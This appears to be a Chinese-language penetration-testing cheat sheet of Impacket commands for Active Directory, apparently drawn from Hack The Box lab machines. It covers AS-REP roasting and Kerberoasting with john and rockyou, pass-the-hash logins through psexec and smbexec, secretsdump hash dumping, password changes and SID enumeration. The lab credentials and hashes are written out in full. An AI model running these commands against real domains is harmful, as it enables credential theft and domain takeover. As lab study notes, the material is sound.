# kerberos

## GetNPUsers.py,请求不需要预认证的票据(需要一份用户名单)
```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile /root/htb/Forest/user  -outputfile hashes.asreproast -dc-ip 10.10.10.161
```

上面的结果使用john破解
```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast
```


## GetUserSPNs.py，获取SPN
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
```

上面的结果使用john破解
```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
```


# 登录
psexec.py，明文密码登录
```
python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.180
```

psexec.py，pth登录
```
python3 /usr/share/doc/python3-impacket/examples/psexec.py htb/Administrator@10.10.10.161  -hashes "32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6"
```

smbexec.py，smb登录
```
python3 /usr/share/doc/python3-impacket/examples/smbexec.py Administrator@10.10.10.161 -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6
```


mssqlclient.py, mssql登录
```
/root/impacket/examples/mssqlclient.py POO_PUBLIC\external_user:'#p00Public3xt3rnalUs3r#'@10.13.38.11 -windows-auth
```


# hash dump

已经有了DCSync的权限（或者对ADMIN$有读写权限），可以使用secretsdump.py导出所有用户哈希
```
python3 /root/impacket-master/examples/secretsdump.py htb.local/max:max@123456@10.10.10.161
```

# 修改smb密码
smbpasswd.py
```
python3 /root/impacket-master/examples/smbpasswd.py  fabricorp.local/tlavel:Fabricorp01@10.10.10.193 -newpass 'Fabricorp02'
```

# 枚举用户名
lookupsid.py
```
python3 /opt/impacket/examples/lookupsid.py anonymous@10.10.33.36
```